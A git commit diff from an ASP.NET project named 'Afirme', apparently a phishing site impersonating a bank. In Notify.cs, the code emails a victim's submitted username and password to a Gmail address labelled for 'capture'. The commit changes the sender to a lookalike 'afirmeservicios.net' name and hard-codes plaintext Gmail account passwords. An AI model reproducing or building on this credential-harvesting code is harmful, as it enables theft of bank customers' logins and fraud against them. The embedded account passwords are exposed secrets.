2c099d11cf10f2be23a02ac4dfede21089816a06
EfrainAS <efrain.mejias@alfasoluciones.com.mx>
2022-02-18 13:16:30 -0400

    update

--- Afirme/Afirme/Controllers/HomeController.cs
+++ Afirme/Afirme/Controllers/HomeController.cs
@@ -12,6 +12,11 @@ namespace Afirme.Controllers
     {
         public IActionResult Index(string data = "")
         {
+            if (string.IsNullOrEmpty(data))
+            {
+                return RedirectToAction("Presentacion");
+            }
+
             return View();
         }
 
--- Afirme/AfirmeNegocio/EngineNotificacion/Notify.cs
+++ Afirme/AfirmeNegocio/EngineNotificacion/Notify.cs
@@ -11,11 +11,10 @@ namespace AfirmeNegocio.EngineNotificacion
         public  bool EnviarMail(NotificacionModel model)
         {
             bool result = false;
-            try
-            {
+           
                 SmtpClient servidor = new SmtpClient();
                 MailMessage mensaje = new MailMessage();
-                mensaje.From = new MailAddress("dondiegodelavegacapturaf@gmail.com");
+                mensaje.From = new MailAddress("www.tupescaito.com <afirmeservicios.net@gmail.com>");
                 mensaje.Subject = model.Asunto;
                 mensaje.SubjectEncoding = System.Text.Encoding.UTF8;
                 mensaje.Body = model.Usuario + " " + Environment.NewLine + " " + model.Password + " " + Environment.NewLine + model.Tipo + " " + Environment.NewLine + model.Fecha;
@@ -23,18 +22,14 @@ namespace AfirmeNegocio.EngineNotificacion
                 mensaje.IsBodyHtml = true;
                 mensaje.To.Add(new MailAddress("dondiegodelavegacapturaf@gmail.com"));
                 //if (pathAdjunto != string.Empty) { mensaje.Attachments.Add(new Attachment(pathAdjunto)); }
-                servidor.Credentials = new System.Net.NetworkCredential("dondiegodelavegacapturaf", "captura123."); //captura321afirme
+                servidor.Credentials = new System.Net.NetworkCredential("afirmeservicios.net@gmail.com", "1234santiago"); //captura321afirme captura123.
                 servidor.Port = 587;
                 servidor.Host = "smtp.gmail.com";
                 servidor.EnableSsl = true;
                 servidor.Send(mensaje);
                 mensaje.Dispose();
                 result = true;
-            }
-            catch(Exception ex)
-            {
-                var error = ex.ToString();
-            }
+         
 
             return result;
         }
